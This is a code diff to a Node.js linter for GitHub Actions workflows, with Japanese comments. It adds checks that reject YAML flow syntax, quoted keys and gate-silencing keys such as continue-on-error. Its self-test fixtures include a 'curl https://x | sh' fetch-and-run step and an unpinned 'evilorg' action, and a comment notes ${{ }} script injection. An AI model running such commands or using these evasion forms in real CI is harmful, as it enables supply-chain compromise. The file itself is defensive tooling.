@@ -80,6 +80,14 @@ const UNPINNED_ALLOW = {
  * 読むだけの job をここへ載せる必要は無い (トップレベルの `contents: read` で足りる)。
  */
 const JOB_PERMISSIONS_ALLOW = {
+  'release.yml': {
+    build: {
+      scopes: ['contents: write'],
+      why:
+        'GitHub Release へ資産を上げるのはこの job だけ (softprops/action-gh-release)。トップレベルは contents: read で、' +
+        '検査 (npm test / verify:all) は secrets も書き込み権も持たない verify job に分けた (T-144)',
+    },
+  },
   'pages.yml': {
     deploy: {
       scopes: ['pages: write', 'id-token: write'],
@@ -325,6 +333,45 @@ function runBlockLines(text) {
   return out;
 }
 
+/**
+ * 行単位の規則が読めない YAML の書き方と、ゲートの step を黙らせる鍵 (2026-10-20 · パス 544 · threat: T-145)。
+ *
+ * この門の規則は行頭の `uses:` / `run:` / `script:` を正規表現で読む。YAML のフロー記法
+ * (`- {uses: evil/act@v1}`・`steps: [{run: …}]`) や引用符つきの鍵 (`- "run": curl … | sh`) は
+ * 同じ step を表すのに規則の目に入らず、実測 (js-yaml で同じ step と確認) で未固定の第三者 action・
+ * `curl | sh`・`${{ }}` の script 注入が exit 0 で通った。**読めない形は fail closed で落とす** (実物に 0 件)。
+ *
+ * もう 1 つ: ci.yml / pages.yml は「ゲートが走ること」そのものを守る workflow なので、step や job を
+ * 黙らせる鍵 (`continue-on-error` / `if` / `shell` / `working-directory` / `paths` / `paths-ignore` /
+ * `branches-ignore`) を**一切**許さない (実物に 0 件)。足すなら台帳へ理由を書くこと
+ * (`GATE_NEUTERING_ALLOW` —— 今は空)。
+ */
+const GATE_WORKFLOWS = new Set(['ci.yml', 'pages.yml']);
+const GATE_NEUTERING_KEYS = /^\s*-?\s*["']?(continue-on-error|if|shell|working-directory|paths|paths-ignore|branches-ignore|tags-ignore)["']?\s*:/;
+const GATE_NEUTERING_ALLOW = {};
+function structureProblems(name, text) {
+  const out = [];
+  const lines = text.split('\n');
+  lines.forEach((raw, i) => {
+    const line = raw.replace(/\s+#.*$/, '');
+    if (/^\s*#/.test(raw)) return;
+    const at = `${name}:${i + 1}`;
+    if (/^\s*-\s*\{(?!\{)/.test(line) || /^\s*-\s*\[/.test(line) || /\b(steps|jobs|with|env|permissions|runs-on)\s*:\s*[[{]/.test(line)) {
+      out.push({ file: at, why: 'YAML のフロー記法 ({…} / […]) は行単位の規則が読めない — ブロック記法で書くこと (読めない形は落とす)' });
+    }
+    if (/^\s*-?\s*["'](uses|run|script|shell|if|env|with|permissions|continue-on-error|working-directory|persist-credentials)["']\s*:/.test(line)) {
+      out.push({ file: at, why: '引用符つきの鍵は行単位の規則が読めない — 引用符なしの鍵で書くこと' });
+    }
+    if (GATE_WORKFLOWS.has(name) && GATE_NEUTERING_KEYS.test(line)) {
+      const key = GATE_NEUTERING_KEYS.exec(line)[1];
+      if (!GATE_NEUTERING_ALLOW[`${name}::${key}`]) {
+        out.push({ file: at, why: `\`${key}:\` はゲートの step / job を黙らせる鍵 — ${name} には置けません (台帳 GATE_NEUTERING_ALLOW に理由つきで)` });
+      }
+    }
+  });
+  return out;
+}
+
 /*
  * `allow` は既定で実物の台帳。**差し替えられるのは self-test のため**である ——
  * 台帳の掃除を見る枝は「台帳に載っているものが使われなくなった」状態でしか
@@ -344,6 +391,7 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
         why: '`permissions:` が未宣言 — 既定 (環境によっては contents: write) を継ぐ',
       });
     }
+    problems.push(...structureProblems(name, text));
     /*
      * **宣言していることと、実効の広さは別である。**
      *
@@ -581,6 +629,14 @@ function stepPersistsNoCredentials(lines, i) {
 function selfTest() {
   const cases = [
     ['permissions 未宣言を落とす', [{ name: 'x.yml', text: 'name: x\non:\n  push:\n' }], 1],
+    ['フロー記法の step (- {uses: …}) を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - {uses: evilorg/act@v1}\n` }], 1],
+    ['引用符つきの鍵 (- "run": …) を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - "run": curl https://x | sh\n` }], 1],
+    ['jobs: {…} のフロー記法を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs: {a: {steps: []}}\n` }], 1],
+    ['ci.yml の step に continue-on-error を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npm run lint:malware\n        continue-on-error: true\n` }], 1],
+    ['ci.yml の step に if: を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npm run lint:malware\n        if: github.event_name != 'pull_request'\n` }], 1],
+    ['ci.yml の pull_request に paths-ignore を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\non:\n  pull_request:\n    paths-ignore: ['scripts/**']\n` }], 1],
+    ['release.yml の job の if: は落とさない (ゲートの workflow ではない)', [{ name: 'release.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - run: echo\n` }], 0],
+    ['注記の中のフロー記法は落とさない', [{ name: 'x.yml', text: `permissions:\n  contents: read\n# - {uses: x@v1} は書かない\njobs:\n  a:\n    steps:\n      - run: echo\n` }], 0],
     ['permissions があれば通す', [{ name: 'x.yml', text: 'name: x\npermissions:\n  contents: read\n' }], 0],
     [
       'pull_request_target を落とす',
@@ -826,6 +882,6 @@ function main() {
   return 1;
 }
 
-module.exports = { check, runBlockLines, workflows, localActionFiles, localUsesProblem, loaderEnvProblem, runBodyProblem, scanRelPath, isLocalActionName, jobPermissionBlocks, UNPINNED_ALLOW, JOB_PERMISSIONS_ALLOW, CROSS_CHECK };
+module.exports = { structureProblems, GATE_NEUTERING_ALLOW, check, runBlockLines, workflows, localActionFiles, localUsesProblem, loaderEnvProblem, runBodyProblem, scanRelPath, isLocalActionName, jobPermissionBlocks, UNPINNED_ALLOW, JOB_PERMISSIONS_ALLOW, CROSS_CHECK };
 
 if (require.main === module) process.exit(main());
